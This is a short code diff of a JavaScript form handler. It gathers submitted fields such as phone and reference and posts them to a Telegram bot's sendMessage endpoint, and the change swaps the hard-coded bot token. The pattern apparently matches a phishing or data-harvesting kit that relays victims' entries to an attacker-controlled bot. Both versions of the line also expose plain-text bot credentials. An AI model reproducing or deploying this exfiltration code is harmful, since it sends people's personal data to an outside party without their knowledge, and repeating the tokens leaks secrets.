@@ -44,7 +44,7 @@ document.getElementById("dataForm").addEventListener("submit", function(e) {
         "Phone: " + phone + "\n" +
         "Reference: " + reference;
 
-    fetch("https://api.telegram.org/bot8556688543:AAGYOwyjJGED3PK9ab0quItrbS62opHX7qc/sendMessage", {
+    fetch("https://api.telegram.org/bot8556688543:AAEIz6mWL8TAcwQyc9TeHS6H_10f2n1EqHg/sendMessage", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
